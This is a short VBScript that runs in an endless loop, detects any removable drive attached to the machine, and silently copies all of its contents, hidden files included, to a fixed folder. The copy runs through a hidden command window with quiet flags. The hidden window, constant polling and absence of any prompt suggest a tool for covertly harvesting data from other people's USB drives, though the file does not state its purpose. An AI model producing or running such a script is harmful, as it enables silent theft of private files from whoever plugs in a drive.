' make the modified vbs file for all external or removable drive
' Define destination directory and sleep duration
destDir = "D:\Copy\"
sleepDuration = 100

' Create FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Main loop
Do
    ' Get all drives
    Set colDrives = objFSO.Drives
    
    ' Loop through each drive
    For Each objDrive in colDrives
        ' Check if the drive is removable (external)
        If objDrive.DriveType = 1 Then
            sourceDir = objDrive.DriveLetter & ":\"
            
            ' Run the copy command
            Set WshShell = WScript.CreateObject("WScript.Shell")
            WshShell.Run "cmd /c xcopy " & sourceDir & " " & destDir & " /D /E /H /I /Q /Y", 0, True
            
            ' Release objects
            Set WshShell = Nothing
        End If
    Next
    
    ' Sleep for the specified duration
    WScript.Sleep sleepDuration
Loop
